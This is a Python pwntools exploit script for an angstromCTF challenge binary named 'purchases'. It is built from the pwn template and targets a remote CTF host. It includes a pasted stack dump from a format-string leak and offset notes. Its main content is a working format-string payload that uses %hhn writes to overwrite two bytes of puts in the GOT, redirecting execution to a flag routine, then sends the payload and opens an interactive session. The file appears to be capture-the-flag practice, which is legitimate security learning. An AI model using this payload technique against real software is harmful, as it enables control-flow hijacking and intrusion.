#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 19011 purchases
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('purchases')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 19011)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

"""
$6 │ rsp  0x7fffffffdd10 ◂— 0xb /* '\x0b' */
$7 │      0x7fffffffdd18 ◂— 0x3e8f7dd7660
$8 │ rdi  0x7fffffffdd20 ◂— '1:%1$p|2:%2$p|3:%3$p|4:%4$p|5:%5$p|6:%6$p|7:%7$p|8:%8$p'
$9 │      0x7fffffffdd28 ◂— ':%2$p|3:%3$p|4:%4$p|5:%5$p|6:%6$p|7:%7$p|8:%8$p'
 │      0x7fffffffdd30 ◂— '%3$p|4:%4$p|5:%5$p|6:%6$p|7:%7$p|8:%8$p'
 │      0x7fffffffdd38 ◂— '4$p|5:%5$p|6:%6$p|7:%7$p|8:%8$p'
 │      0x7fffffffdd40 ◂— '$p|6:%6$p|7:%7$p|8:%8$p'
 │       0x7fffffffdd48 ◂— 'p|7:%7$p|8:%8$p'
 |      0x7fffffffdd50 ◂— 0x702438253a387c /* '|8:%8$p' */
15 │      0x7fffffffdd58 —▸ 0x401000 (_init) ◂— endbr64
16 │      0x7fffffffdd60 —▸ 0x7fffffffde50 ◂— 0x1   <------------ stack address
 │      0x7fffffffdd68 ◂— 0xf9186d5f51232b00
18 │ rbp  0x7fffffffdd70 —▸ 0x401350 (__libc_csu_init) ◂— endbr64
19 │      0x7fffffffdd78 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
 │      0x7fffffffdd80 ◂— 0x1
 │      0x7fffffffdd88 —▸ 0x7fffffffde58 —▸ 0x7fffffffe1ce ◂— '/home/dc/angstromctf/purchases_pwn/purchases'
 │      0x7fffffffdd90 ◂— 0x100008000
 │      0x7fffffffdd98 —▸ 0x4011c9 (main) ◂— push   rbp
 │      0x7fffffffdda0 ◂— 0x0
 │      0x7fffffffdda8 ◂— 0x596b4d55ff4204b9
 │      0x7fffffffddb0 —▸ 0x4010d0 (_start) ◂— endbr64
 │      0x7fffffffddb8 —▸ 0x7fffffffde50 ◂— 0x1
 │      0x7fffffffddc0 ◂— 0x0
"""

# So index 0x24 = 36 => retaddr
# We need to overwrite got
got_puts = 0x404018
# [0x404018] puts@GLIBC_2.2.5 -> 0x401036 (puts@plt+6) ◂— push   0 /* 'h' */

# Flag addr     = 0x40 11 b6
# Puts default  = 0x40 10 36
# We need to overwrite just 2 bytes

# $8 == buffer
# $9 == buffer+8
# $10 == buffer+16
# $11 == buffer+24
# $12 == buffer+32
# $13 == buffer+32

# write 0x11=17
# write 0xb6=182 = 165 + 17
payload = "%017u%12$hhn%0165u%13$hhn"
# We must now fill the rest of buffer and put got_puts+7, got_puts+6 addresses!
payload += 'a'
payload += '\x00' * (32-len(payload))
payload += p64(got_puts+1)
payload += p64(got_puts)
payload += '\n'


io.recvuntil('What item would you like to purchase? ')
io.send(payload)

io.interactive()

